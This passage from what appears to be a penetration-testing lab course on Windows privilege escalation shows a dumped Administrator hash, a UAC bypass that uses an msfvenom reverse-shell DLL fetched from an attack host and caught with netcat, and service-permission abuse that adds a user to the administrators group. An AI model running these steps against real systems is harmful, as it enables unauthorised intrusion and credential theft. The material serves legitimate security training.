Impacket v0.<span class="hljs-number">9.22</span>.dev1+<span class="hljs-number">20200929.152157</span>.fe642b24 - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] <span class="hljs-keyword">Using</span> the DRSUAPI <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">to</span> <span class="hljs-title">get</span> <span class="hljs-title">NTDS</span>.<span class="hljs-title">DIT</span> <span class="hljs-title">secrets</span>
<span class="hljs-title">Administrator</span>:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">5</span>db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-<span class="hljs-number">96</span>:<span class="hljs-number">94</span>c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
</code></pre>
<h2 id="user-account-control">User Account Control</h2>
<hr>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">User Account Control (UAC)</a> is a feature that enables a consent prompt for elevated activities. Applications have different <code>integrity</code> levels, and a program with a high level can perform tasks that could potentially compromise the system. When UAC is enabled, applications and tasks always run under the security context of a non-administrator account unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.</p>
<p>When UAC is in place, a user can log into their system with their standard user account. When processes are launched using a standard user token, they can perform tasks using the rights granted to a standard user. Some applications require additional permissions to run, and UAC can provide additional access rights to the token for them to run correctly.</p>
<p>This <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">page</a> discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings">here</a>. There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:</p>
<table>
<thead>
<tr>
<th>Group Policy Setting</th>
<th>Registry Key</th>
<th>Default Setting</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account">User Account Control: Admin Approval Mode for the built-in Administrator account</a></td>
<td>FilterAdministratorToken</td>
<td>Disabled</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop">User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop</a></td>
<td>EnableUIADesktopToggle</td>
<td>Disabled</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode">User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode</a></td>
<td>ConsentPromptBehaviorAdmin</td>
<td>Prompt for consent for non-Windows binaries</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users">User Account Control: Behavior of the elevation prompt for standard users</a></td>
<td>ConsentPromptBehaviorUser</td>
<td>Prompt for credentials on the secure desktop</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation">User Account Control: Detect application installations and prompt for elevation</a></td>
<td>EnableInstallerDetection</td>
<td>Enabled (default for home) Disabled (default for enterprise)</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated">User Account Control: Only elevate executables that are signed and validated</a></td>
<td>ValidateAdminCodeSignatures</td>
<td>Disabled</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations">User Account Control: Only elevate UIAccess applications that are installed in secure locations</a></td>
<td>EnableSecureUIAPaths</td>
<td>Enabled</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode">User Account Control: Run all administrators in Admin Approval Mode</a></td>
<td>EnableLUA</td>
<td>Enabled</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation">User Account Control: Switch to the secure desktop when prompting for elevation</a></td>
<td>PromptOnSecureDesktop</td>
<td>Enabled</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations">User Account Control: Virtualize file and registry write failures to per-user locations</a></td>
<td>EnableVirtualization</td>
<td>Enabled</td>
</tr>
</tbody>
</table>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings">Source</a></p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/uac.png" alt="image"></p>
<p>UAC should be enabled, and although it may not stop an attacker from gaining privileges, it is an extra step that may slow this process down and force them to become noisier.</p>
<p>The <code>default RID 500 administrator</code> account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account <code>sarah</code> is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.</p>
<p><strong>Checking Current User</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /user

<span class="hljs-section">USER INFORMATION
----------------</span>

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
</code></pre>
<p><strong>Confirming Admin Group Membership</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator
mrb3n
sarah
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<p><strong>Reviewing User Privileges</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
</code></pre>
<p><strong>Confirming UAC is Enabled</strong></p>
<p>There is no command-line version of the GUI consent prompt, so we will have to bypass UAC to execute commands with our privileged access token. First, let&#39;s confirm if UAC is enabled and, if so, at what level.</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; REG QUERY HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\ </span>/v EnableLUA

HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem
    EnableLUA    REG_DWORD    0x1
</code></pre>
<p><strong>Checking UAC Level</strong></p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; REG QUERY HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\ </span>/v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\S</span>ystem
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
</code></pre>
<p>The value of <code>ConsentPromptBehaviorAdmin</code> is <code>0x5</code>, which means the highest UAC level of <code>Always notify</code> is enabled. There are fewer UAC bypasses at this highest level.</p>
<p><strong>Checking Windows Version</strong></p>
<p>UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let&#39;s examine the build of Windows we&#39;re looking to elevate on.</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\htb</span>&gt; <span class="hljs-title">[</span><span class="hljs-comment">environment</span><span class="hljs-title">]</span><span class="hljs-comment">::OSVersion</span><span class="hljs-string">.</span><span class="hljs-comment">Version</span>

<span class="hljs-comment">Major</span>  <span class="hljs-comment">Minor</span>  <span class="hljs-comment">Build</span>  <span class="hljs-comment">Revision</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-comment">10</span>     <span class="hljs-comment">0</span>      <span class="hljs-comment">14393</span>  <span class="hljs-comment">0</span>
</code></pre>
<p>This returns the build version 14393, which using <a href="https://en.wikipedia.org/wiki/Windows\_10\_version\_history">this</a> page we cross-reference to Windows release <code>1607</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/build.png" alt="image"></p>
<p>The <a href="https://github.com/hfiref0x/UACME">UACME</a> project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let&#39;s use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary <code>SystemPropertiesAdvanced.exe</code>. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.</p>
<p>According to <a href="https://egre55.github.io/system-properties-uac-bypass">this</a> blog post, the 32-bit version of <code>SystemPropertiesAdvanced.exe</code> attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.</p>
<p>When attempting to locate a DLL, Windows will use the following search order.</p>
<ol>
<li>The directory from which the application loaded.</li>
<li>The system directory <code>C:\Windows\System32</code> for 64-bit systems.</li>
<li>The 16-bit system directory <code>C:\Windows\System</code> (not supported on 64-bit systems)</li>
<li>The Windows directory.</li>
<li>Any directories that are listed in the PATH environment variable.</li>
</ol>
<p><strong>Reviewing Path Variable</strong></p>
<p>Let&#39;s examine the path variable using the command <code>cmd /c echo %PATH%</code>. This reveals the default folders below. The <code>WindowsApps</code> folder is within the user&#39;s profile and writable by the user.</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; cmd /c echo <span class="hljs-variable">%PATH%</span>

C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\s</span>ystem32;
C:<span class="hljs-symbol">\W</span>indows;
C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\W</span>bem;
C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\v</span>1.0<span class="hljs-symbol">\;</span>
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>arah<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsApps;
</code></pre>
<p>We can potentially bypass UAC in this by using DLL hijacking by placing a malicious <code>srrstr.dll</code> DLL to <code>WindowsApps</code> folder, which will be loaded in an elevated context.</p>
<p><strong>Generating Malicious srrstr.dll DLL</strong></p>
<p>First, let&#39;s generate a DLL to execute a reverse shell.</p>
<pre><code class="lang-shell-session">[!bash!]$ msfvenom -p windows/shell_reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.3</span> LPORT=<span class="hljs-number">8443</span> -f dll &gt; srrstr.dll

[-] No <span class="hljs-keyword">platform</span> was selected, choosing Msf::<span class="hljs-keyword">Module</span>::<span class="hljs-keyword">Platform</span>::Windows <span class="hljs-keyword">from</span> the payload
[-] No arch selected, selecting arch: x86 <span class="hljs-keyword">from</span> the payload
No encoder specified, outputting raw payload
Payload size: <span class="hljs-number">324</span> bytes
<span class="hljs-keyword">Final</span> size <span class="hljs-keyword">of</span> dll file: <span class="hljs-number">5120</span> bytes
</code></pre>
<p>Note: In the example above, we specified our tun0 VPN IP address.</p>
<p><strong>Starting Python HTTP Server on Attack Host</strong></p>
<p>Copy the generated DLL to a folder and set up a Python mini webserver to host it.</p>
<pre><code class="lang-shell-session">[!bash!]$ sudo python3 -m http.server <span class="hljs-number">8080</span>
</code></pre>
<p><strong>Downloading DLL Target</strong></p>
<p>Download the malicious DLL to the target system, and stand up a <code>Netcat</code> listener on our attack machine.</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt;curl http://10.10.14.3:8080/srrstr.dll -O "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>arah<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsApps<span class="hljs-symbol">\s</span>rrstr.dll"
</code></pre>
<p><strong>Starting nc Listener on Attack Host</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ nc -lvnp <span class="hljs-number">8443</span>
</code></pre>
<p><strong>Testing Connection</strong></p>
<p>If we execute the malicious <code>srrstr.dll</code> file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using <code>rundll32.exe</code> to get a reverse shell connection.</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; rundll32 shell32.dll,Control_RunDLL C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\s</span>arah<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indowsApps<span class="hljs-symbol">\s</span>rrstr.dll
</code></pre>
<p>Once we get a connection back, we&#39;ll see normal user rights.</p>
<pre><code class="lang-shell-session">[!bash!]$ nc -lnvp 8443

listening on [any] 8443 ...

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Users\sarah&gt; whoami /priv

whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
</code></pre>
<p><strong>Executing SystemPropertiesAdvanced.exe on Target Host</strong></p>
<p>Now, we can execute the 32-bit version of <code>SystemPropertiesAdvanced.exe</code> from the target host.</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ysWOW64<span class="hljs-symbol">\S</span>ystemPropertiesAdvanced.exe
</code></pre>
<p><strong>Receiving Connection Back</strong></p>
<p>Checking back on our listener, we should receive a connection almost instantly.</p>
<pre><code class="lang-shell-session">[!bash!]$ nc -lvnp <span class="hljs-number">8443</span>

listening <span class="hljs-keyword">on</span> [any] <span class="hljs-number">8443</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.3</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.43</span><span class="hljs-number">.16</span>] <span class="hljs-number">50273</span>
Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.14393</span>]
(c) <span class="hljs-number">2016</span> Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32&gt;whoami /priv

whoami /priv
PRIVILEGES INFORMATION
<span class="hljs-comment">----------------------</span>
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="hljs-keyword">for</span> a process                                 Disabled
SeSecurityPrivilege                       Manage auditing <span class="hljs-keyword">and</span> security <span class="hljs-built_in">log</span>                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership <span class="hljs-keyword">of</span> files <span class="hljs-keyword">or</span> other objects                           Disabled
SeLoadDriverPrivilege                     Load <span class="hljs-keyword">and</span> unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change <span class="hljs-keyword">the</span> system <span class="hljs-built_in">time</span>                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files <span class="hljs-keyword">and</span> directories                                      Disabled
SeRestorePrivilege                        Restore files <span class="hljs-keyword">and</span> directories                                      Disabled
SeShutdownPrivilege                       Shut down <span class="hljs-keyword">the</span> system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown <span class="hljs-keyword">from</span> a remote system                                Disabled
SeUndockPrivilege                         Remove computer <span class="hljs-keyword">from</span> docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client <span class="hljs-keyword">after</span> authentication                          Enabled
SeCreateGlobalPrivilege                   Create <span class="hljs-keyword">global</span> objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working <span class="hljs-keyword">set</span>                                     Disabled
SeTimeZonePrivilege                       Change <span class="hljs-keyword">the</span> <span class="hljs-built_in">time</span> zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="hljs-keyword">for</span> another user <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> same session Disabled
</code></pre>
<p>This is successful, and we receive an elevated shell that shows our privileges are available and can be enabled if needed.</p>
<h2 id="weak-permissions">Weak Permissions</h2>
<hr>
<p>Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don&#39;t have our tools readily available.</p>
<hr>
<h3 id="permissive-file-system-acls">Permissive File System ACLs</h3>
<p><strong>Running SharpUp</strong></p>
<p>We can use <a href="https://github.com/GhostPack/SharpUp/">SharpUp</a> from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.</p>
<p>Weak Permissions</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; .\SharpUp.exe audit

<span class="hljs-section">=== SharpUp: Running Privilege Escalation Checks ===</span>


<span class="hljs-section">=== Modifiable Service Binaries ===</span>

<span class="hljs-code">  Name             : SecurityService</span>
<span class="hljs-code">  DisplayName      : PC Security Management Service</span>
<span class="hljs-code">  Description      : Responsible for managing PC security</span>
<span class="hljs-code">  State            : Stopped</span>
<span class="hljs-code">  StartMode        : Auto</span>
<span class="hljs-code">  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"</span>

<span class="hljs-code">  &lt;SNIP&gt;</span>
</code></pre>
<p>The tool identifies the <code>PC Security Management Service</code>, which executes the <code>SecurityService.exe</code> binary when started.</p>
<p><strong>Checking Permissions with icacls</strong></p>
<p>Using <a href="https://ss64.com/nt/icacls.html">icacls</a> we can verify the vulnerability and see that the <code>EVERYONE</code> and <code>BUILTIN\Users</code> groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.</p>
<p>Weak Permissions</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; icacls "C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\P</span>CProtect<span class="hljs-symbol">\S</span>ecurityService.exe"

C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\P</span>CProtect<span class="hljs-symbol">\S</span>ecurityService.exe BUILTIN<span class="hljs-symbol">\U</span>sers:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY<span class="hljs-symbol">\S</span>YSTEM:(I)(F)
                                                     BUILTIN<span class="hljs-symbol">\A</span>dministrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY<span class="hljs-symbol">\A</span>LL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY<span class="hljs-symbol">\A</span>LL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
</code></pre>
<p><strong>Replacing Service Binary</strong></p>
<p>This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with <code>msfvenom</code>. It can give us a reverse shell as <code>SYSTEM</code>, or add a local admin user and give us full administrative control over the machine.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; cmd /c copy /Y SecurityService.exe "C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\P</span>CProtect<span class="hljs-symbol">\S</span>ecurityService.exe"
C:<span class="hljs-symbol">\h</span>tb&gt; sc start SecurityService
</code></pre>
<hr>
<h3 id="weak-service-permissions">Weak Service Permissions</h3>
<p><strong>Reviewing SharpUp Again</strong></p>
<p>Let&#39;s check the <code>SharpUp</code> output again for any modifiable services. We see the <code>WindscribeService</code> is potentially misconfigured.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:\htb&gt; SharpUp.exe audit

<span class="hljs-section">=== SharpUp: Running Privilege Escalation Checks ===</span>


<span class="hljs-section">=== Modifiable Services ===</span>

<span class="hljs-code">  Name             : WindscribeService</span>
<span class="hljs-code">  DisplayName      : WindscribeService</span>
<span class="hljs-code">  Description      : Manages the firewall and controls the VPN tunnel</span>
<span class="hljs-code">  State            : Running</span>
<span class="hljs-code">  StartMode        : Auto</span>
<span class="hljs-code">  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"</span>
</code></pre>
<p><strong>Checking Permissions with AccessChk</strong></p>
<p>Next, we&#39;ll use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk</a> from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are <code>-q</code> (omit banner), <code>-u</code> (suppress errors), <code>-v</code> (verbose), <code>-c</code> (specify name of a Windows service), and <code>-w</code> (show only objects that have write access). Here we can see that all Authenticated Users have <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">SERVICE_ALL_ACCESS</a> rights over the service, which means full read/write control over it.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb&gt; accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6<span class="hljs-number">.13</span> - Reports effective permissions for securable objects
Copyright ⌐ <span class="hljs-number">2006</span><span class="hljs-number">-2020</span> Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
  <span class="hljs-keyword">Medium</span> Mandatory <span class="hljs-keyword">Level</span> (<span class="hljs-keyword">Default</span>) [No-<span class="hljs-keyword">Write</span>-<span class="hljs-keyword">Up</span>]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
</code></pre>
<p><strong>Check Local Admin Group</strong></p>
<p>Checking the local administrators group confirms that our user <code>htb-student</code> is not a member.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator
mrb3n
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
<p><strong>Changing the Service Binary Path</strong></p>
<p>We can use our permissions to change the binary path maliciously. Let&#39;s change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:\htb&gt; <span class="hljs-keyword">sc</span> config WindscribeService binpath=<span class="hljs-string">"cmd /c net localgroup administrators htb-student /add"</span>

[<span class="hljs-keyword">SC</span>] ChangeServiceConfig SUCCESS
</code></pre>
<p><strong>Stopping Service</strong></p>
<p>Next, we must stop the service, so the new <code>binpath</code> command will run the next time it is started.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc stop WindscribeService

<span class="hljs-attribute">SERVICE_NAME</span>: WindscribeService
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">3</span>  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x4
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<p><strong>Starting the Service</strong></p>
<p>Since we have full control over the service, we can start it again, and the command we placed in the <code>binpath</code> will run even though an error message is returned. The service fails to start because the <code>binpath</code> is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the <code>binpath</code>.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> sc start WindscribeService

[SC] StartService FAILED <span class="hljs-number">1053</span>:

The service did <span class="hljs-keyword">not</span> respond <span class="hljs-keyword">to</span> the start <span class="hljs-keyword">or</span> control request <span class="hljs-keyword">in</span> a timely fashion.
</code></pre>
<p><strong>Confirming Local Admin Group Addition</strong></p>
<p>Finally, check to confirm that our user was added to the local administrators group.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete <span class="hljs-keyword">and</span> unrestricted access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> computer/domain

Members

<span class="hljs-comment">-------------------------------------------------------------------------------</span>
Administrator
htb-student
mrb3n
The <span class="hljs-keyword">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.
</code></pre>
